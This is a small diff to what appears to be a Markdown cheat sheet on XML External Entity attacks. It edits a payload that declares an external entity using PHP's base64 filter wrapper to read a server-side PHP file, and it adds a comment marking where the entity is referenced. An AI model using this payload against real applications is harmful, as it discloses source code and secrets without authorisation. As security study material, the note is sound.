@@ -35,8 +35,11 @@ Sometimes the files we try to display are not in proper [[XML]] format that is s
 
 ```xml
 <!DOCTYPE email [
-  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=filename.php">
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/path/to/filename.php">
 ]>
+
+<!-- somewhere
+<> &company; <>
 ```
 
 ##### Using CDATA
